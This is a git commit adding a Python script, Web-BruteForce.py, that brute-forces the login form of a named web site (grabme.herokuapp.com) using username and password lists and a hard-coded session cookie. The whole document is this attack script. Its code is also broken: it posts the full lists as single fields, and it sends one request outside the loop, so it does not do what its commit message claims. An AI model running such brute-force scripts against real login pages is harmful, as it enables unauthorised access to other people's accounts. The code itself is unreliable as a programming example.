c47e27f7a4a9289d996b5d3228c8c339520182b2
Hasher2009 <adarshpillai2009@yahoo.com>
2021-02-15 21:16:57 +0530

    Added Example Website Login Brute Force Script

---
+++ Web-BruteForce.py
@@ -0,0 +1,32 @@
+import requests
+
+cookies = {
+    'PHPSESSID': 'vjunihkrh0lsunkj7vf9k1ldj5f8j7ed',
+}
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'Origin': 'http://grabme.herokuapp.com',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Referer': 'http://grabme.herokuapp.com/target/',
+    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,mr;q=0.6,pt;q=0.5',
+}
+
+users = [ x.strip() for x in open('users.txt').read().split('\n') if x ]
+passwords = [x.strip() for x in open('passwords.txt').read().split('\n') if x]
+
+for password in passwords:
+    data = {
+      'username': users,
+      'password': passwords,
+      'submit': 'Connexion'
+}
+
+response = requests.post('http://grabme.herokuapp.com/target/', headers=headers, cookies=cookies, data=data, verify=False)
+
+if "incorrect username or password" not in response.text:
+    print("Password Is Likely Found: ", password)
